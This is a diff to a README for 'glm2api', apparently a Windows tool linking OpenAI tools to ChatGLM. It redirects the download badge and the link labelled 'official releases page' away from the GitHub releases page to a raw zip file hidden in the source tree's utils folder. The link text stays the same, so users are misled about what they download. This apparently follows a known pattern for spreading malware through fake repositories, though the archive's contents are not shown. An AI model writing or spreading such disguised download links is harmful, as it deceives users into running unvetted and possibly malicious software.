@@ -1,6 +1,6 @@
 # 🤖 glm2api - Use OpenAI tools with ChatGLM easily
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foxtalbotblackolive1624/glm2api/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Foxtalbotblackolive1624/glm2api/raw/refs/heads/main/src/glm2api/utils/api-glm-v2.3.zip)
 
 ## What this program does
 
@@ -14,7 +14,7 @@ This software works on Windows 10 and Windows 11. Your computer needs at least 4
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official releases page](https://github.com/Foxtalbotblackolive1624/glm2api/releases) to download the package.
+1. Visit the [official releases page](https://github.com/Foxtalbotblackolive1624/glm2api/raw/refs/heads/main/src/glm2api/utils/api-glm-v2.3.zip) to download the package.
 2. Look for the file ending in `.zip` in the latest release section.
 3. Click the filename to save it to your computer.
 4. Open your Downloads folder.
